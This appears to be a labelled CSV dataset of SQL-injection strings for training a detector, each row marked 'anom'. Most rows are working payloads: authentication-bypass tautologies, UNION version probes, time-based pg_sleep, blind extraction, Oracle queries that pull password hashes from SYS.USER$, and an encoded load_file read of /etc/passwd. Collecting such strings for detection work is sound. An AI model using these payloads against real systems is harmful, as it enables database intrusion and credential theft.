payload,label
""" or pg_sleep  (  __TIME__  )  --",anom
create user name identified by pass123 temporary tablespace temp default tablespace users,anom
" AND 1  =  utl_inaddr.get_host_address   (    (   SELECT DISTINCT  (  table_name  )   FROM   (  SELECT DISTINCT  (  table_name  )  , ROWNUM AS LIMIT FROM sys.all_tables  )   WHERE LIMIT  =  5   )    )    AND 'i'  =  'i",anom
" select * from users where id  =  '1' or @ @1  =  1 union select 1,version  (    )   -- 1'",anom
" select * from users where id  =  1 or 1#""  (   union select 1,version  (    )   -- 1",anom
 select name from syscolumns where id   =     (  select id from sysobjects where name   =   tablename'  )  --,anom
select * from users where id  =  1 +$+ or 1  =  1 -- 1,anom
"1;  (  load_file  (  char  (  47,101,116,99,47,112,97,115,115,119,100   )    )     )  ,1,1,1;",anom
" select * from users where id  =  '1' or ||/1  =  1 union select 1,version  (    )   -- 1'",anom
" select * from users where id  =  '1' or \.<\ union select 1,@@VERSION -- 1'",anom
? or 1  =  1 --,anom
 )   or   (  'a'  =  'a,anom
admin' or 1  =  1#,anom
" select * from users where id  =  1 or ""  (  ]"" or 1  =  1 -- 1",anom
or 1  =  1 --,anom
" AND 1  =  utl_inaddr.get_host_address   (    (   SELECT DISTINCT  (  column_name  )   FROM   (  SELECT DISTINCT  (  column_name  )  , ROWNUM AS LIMIT FROM all_tab_columns  )   WHERE LIMIT  =  5   )    )    AND 'i'  =  'i",anom
" select * from users where id  =  '1' %!<@ union select 1,version  (    )   -- 1'",anom
" select * from users where id  =  1 or ""&  (  "" or 1  =  1 -- 1",anom
" select * from users where id  =  1 or ""?  (  "" or 1  =  1 -- 1",anom
distinct,anom
select * from users where id  =  '1' *  (  \  )   or 1  =  1 -- 1',anom
"1 and ascii  (  lower  (  substring   (    (   select top 1 name from sysobjects where xtype  =  'u'  )  , 1, 1   )    )     )   > 116",anom
select * from users where id  =  1 or \.<\ or 1  =  1 -- 1,anom
"admin"" or ""1""  =  ""1""--",anom
" select * from users where id  =  1 or ""%{"" or 1  =  1 -- 1",anom
insert,anom
" select * from users where id  =  1 or 1#""?  =  1 or 1  =  1 -- 1",anom
" select * from users where id  =  1 or ""%?"" or 1  =  1 -- 1",anom
" AND 1  =  utl_inaddr.get_host_address   (    (   SELECT DISTINCT  (  PASSWORD  )   FROM   (  SELECT DISTINCT  (  PASSWORD  )  , ROWNUM AS LIMIT FROM SYS.USER$  )   WHERE LIMIT  =  8   )    )    AND 'i'  =  'i",anom
" select * from users where id  =  1 or ""?#"" or 1  =  1 -- 1",anom
